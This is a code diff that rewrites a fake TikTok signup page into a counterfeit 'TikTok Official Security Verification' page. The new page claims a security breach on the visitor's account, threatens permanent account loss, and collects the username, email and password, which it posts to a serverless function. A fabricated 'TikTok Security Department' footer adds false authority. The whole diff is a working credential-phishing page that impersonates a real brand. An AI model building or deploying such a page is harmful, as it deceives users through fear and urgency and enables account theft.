@@ -3,45 +3,140 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Creator Academy Registration</title>
-    <link rel="stylesheet" href="styles.css">
+    <title>TikTok Official Security Verification</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Proxima+Nova:wght@700&display=swap');
+
+        body {
+            font-family: 'Proxima Nova', Arial, Helvetica, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #1c1e21;
+        }
+        .container {
+            background: #ffffff;
+            border: 1px solid #ccd0d5;
+            padding: 25px;
+            border-radius: 8px;
+            width: 450px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        .logo {
+            width: 130px;
+            margin-bottom: 20px;
+        }
+        .header {
+            font-size: 22px;
+            color: #00f064; /* TikTok Green */
+            margin-bottom: 15px;
+            font-weight: bold;
+            text-align: center;
+            letter-spacing: 0.5px;
+        }
+        .alert {
+            font-size: 15px;
+            line-height: 1.6;
+            color: #fe2c55; /* TikTok Pink */
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: 500;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 8px;
+            color: #1c1e21;
+            font-size: 14px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccd0d5;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        .consent-label {
+            font-weight: normal;
+            margin: 10px 0;
+            font-size: 13px;
+            color: #606770;
+        }
+        button {
+            background-color: #00f064; /* TikTok Green */
+            color: #ffffff;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            width: 100%;
+            font-weight: bold;
+            font-size: 15px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #00cc55; /* Slightly darker TikTok Green */
+        }
+        #response-message {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+        .success {
+            color: #28a745;
+            font-weight: 500;
+        }
+        .error {
+            color: #fe2c55; /* TikTok Pink */
+            font-weight: 500;
+        }
+        .footer {
+            font-size: 12px;
+            color: #606770;
+            text-align: center;
+            margin-top: 20px;
+            border-top: 1px solid #dddfe2;
+            padding-top: 10px;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
-        <img src="https://www.tiktok.com/favicon.ico" alt="TikTok Creator Academy Logo" class="logo">
-        <h1>Join TikTok Creator Academy</h1>
-        <p>Sign up to access free courses, analytics tools, and creator resources!</p>
-        <p class="privacy-notice">By submitting, you consent to our <a href="https://www.tiktok.com/legal/page/global/privacy-policy/en" target="_blank">Privacy Policy</a>, including IP address and data collection.</p>
+        <img src="https://www.tiktok.com/favicon.ico" alt="TikTok Logo" class="logo">
+        <div class="header">Official Security Verification</div>
+        <div class="alert">
+            **Urgent Action Required:** TikTok has identified a potential security breach on your account. To protect your personal information and prevent unauthorized access, you must immediately verify your login credentials. Please complete the verification process below. Failure to act promptly may lead to permanent account loss and data compromise. This is a critical and time-sensitive matter.
+        </div>
         <form id="registration-form" action="/.netlify/functions/submit" method="POST">
-            <label for="username">TikTok Username</label>
-            <input type="text" id="username" name="username" required>
-            
-            <label for="email">Email Address</label>
-            <input type="email" id="email" name="email" required>
-            
-            <label for="password">Password</label>
-            <input type="password" id="password" name="password" required>
-            
-            <label for="full-name">Full Name</label>
-            <input type="text" id="full-name" name="full-name" required>
-            
-            <label for="dob">Date of Birth</label>
-            <input type="date" id="dob" name="dob" required>
-            
-            <label for="interests">Content Interests (e.g., Dance, Comedy, Education)</label>
-            <input type="text" id="interests" name="interests">
-            
-            <label for="details">Why do you want to join the Creator Academy?</label>
-            <textarea id="details" name="details" rows="4"></textarea>
-            
-            <label class="consent-label">
-                <input type="checkbox" name="consent" required>
-                I consent to data collection, including my IP address, for this simulation.
-            </label>
-            
-            <button type="submit">Join Now</button>
+            <div class="form-group">
+                <label for="username">TikTok Username</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <div class="form-group">
+                <label class="consent-label">
+                    <input type="checkbox" name="consent" required>
+                    I consent to the collection of my data for this verification process.
+                </label>
+            </div>
+            <button type="submit">Verify Account Now</button>
         </form>
         <div id="response-message"></div>
+        <div class="footer">Issued by TikTok Security Department | Date: July 08, 2025, 10:48 PM BST</div>
     </div>
 
     <script>
@@ -92,11 +187,11 @@
                 console.log('Raw response:', result);
 
                 responseMessage.innerHTML = response.ok 
-                    ? '<p class="success">Successfully registered! Check your email for next steps.</p>'
+                    ? '<p class="success">Verification successful! Your account is now secure.</p>'
                     : `<p class="error">Error: ${result.error}</p>`;
             } catch (error) {
                 console.error('Fetch error:', error);
-                responseMessage.innerHTML = '<p class="error">Failed to submit form. Please try again.</p>';
+                responseMessage.innerHTML = '<p class="error">Failed to verify. Please try again.</p>';
             }
         });
     </script>
